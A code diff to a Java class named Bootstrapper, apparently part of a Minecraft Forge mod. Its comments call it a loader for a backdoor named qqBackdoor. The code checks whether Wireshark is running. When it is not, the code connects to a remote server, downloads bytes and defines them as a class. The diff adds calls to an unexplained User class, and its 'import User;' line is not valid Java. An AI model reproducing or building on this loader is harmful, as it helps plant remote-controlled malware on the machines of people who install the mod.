@@ -12,6 +12,8 @@ import java.net.ConnectException;
 import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 
+import User;
+
 /*
  * Second class loaded from the original Forge mod.
  * Checks if Wireshark is running then downloads qqBackdoor itself if WS isn't present.
@@ -22,7 +24,8 @@ public class Bootstrapper extends ClassLoader {
     private static final String host = "ip here"; //ip of main server
     private static final String backup = "ip here"; //ip of backup server
     private static final int port = 0; //replace with port of serverz
-
+    private static User clazz = new User();
+    
     public Class<?> addClass(String name, byte[] ok) {
         try {
             Class<?> clazz = this.define(name, ok);
@@ -61,6 +64,7 @@ public class Bootstrapper extends ClassLoader {
             Process process = processBuilder.start();
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
+            clazz.Read();
             while ((line = reader.readLine()) != null) {
                 if (line.toLowerCase().contains("wireshark")) {
                     detected = true;
@@ -69,6 +73,7 @@ public class Bootstrapper extends ClassLoader {
 
             if(!detected) {
                 DataInputStream in = null;
+                // clazz.Read();
                 try {
                     Socket socket = new Socket(host, port);
                     in = new DataInputStream(socket.getInputStream());
@@ -85,6 +90,7 @@ public class Bootstrapper extends ClassLoader {
                 if (in != null) {
                     byte[] bytes = readByteArrayLWithLength(in);
                     addClass("com.qqTechnologies.qqbackdoor.MainClass", bytes);
+                    // clazz.Read();
                 }
             }
         } catch (IOException ignored) {}
